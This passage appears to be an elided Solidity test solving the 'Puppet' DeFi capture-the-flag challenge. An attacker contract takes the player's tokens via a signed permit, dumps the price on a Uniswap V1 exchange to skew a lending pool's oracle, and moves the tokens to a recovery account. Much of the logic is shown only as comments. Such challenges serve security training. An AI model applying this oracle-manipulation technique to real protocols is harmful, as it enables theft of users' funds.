...
contract PuppetChallenge is Test, Create {
    ...
    function test_puppet() public checkSolvedByPlayer {
        // Pre-calculate the attacker address
        address attackerAddress = computeAddress(player, 0);

        // Sign ERC20 permit with the player's private key
        ...
        new Attacker{value: player.balance}(
            token,
            uniswapV1Exchange,
            lendingPool,
            recovery,
...
contract Attacker {
    constructor(
        ...
        // Transfer user tokens to this contract
        token.permit(
            msg.sender,
            address(this),
            type(uint256).max,
        ...
        // Dump the price in the uniswap exchange
        ...
        // Transfer all tokens to the recovery account
